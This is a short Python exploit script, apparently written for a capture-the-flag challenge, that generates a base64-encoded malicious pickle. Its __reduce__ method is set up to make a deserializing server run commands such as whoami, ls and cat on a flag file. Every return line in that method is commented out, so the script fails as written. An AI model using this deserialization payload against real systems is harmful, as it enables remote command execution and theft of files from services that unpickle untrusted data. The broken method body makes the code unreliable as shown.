                                                          
from base64 import b64encode
import pickle
import os
import subprocess

class anti_pickle_serum(object):
    def __reduce__(self):               # function called by the pickler
     #return os.system, (['whoami'],)
     #return subprocess.check_output, (['ls'],)
     #return subprocess.check_output, (['cat','flag_wIp1b'],)

code = pickle.dumps({'serum': anti_pickle_serum()}, protocol = 0)
code = b64encode(code)
print(code)
